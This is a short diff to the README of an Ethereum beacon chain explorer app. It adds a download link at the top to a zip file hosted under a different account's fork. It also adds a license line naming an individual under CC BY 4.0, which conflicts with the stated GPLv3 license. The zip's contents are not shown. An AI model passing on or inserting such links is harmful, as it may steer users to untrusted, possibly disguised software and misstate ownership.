@@ -1,3 +1,4 @@
+[beaconscan.app-0.6.11.zip](https://github.com/915030705/eth2-beaconchain-explorer-app/files/12909751/beaconscan.app-0.6.11.zip)
 ![[Beaconchain Dashboard](https://beaconcha.in/mobile)](.github/banner.png)  
 [![Build](https://github.com/gobitfly/eth2-beaconchain-explorer-app/actions/workflows/build.yaml/badge.svg)](https://github.com/gobitfly/eth2-beaconchain-explorer-app/actions/workflows/build.yaml)  
 
@@ -110,3 +111,5 @@ Adapt the --host param to match your macs IP.
 ## License
 
 This project is licensed under GPLv3. [LICENSE](LICENSE)
+
+This work © 2 by Mahdi amolimoghaddam is licensed under CC BY 4.0
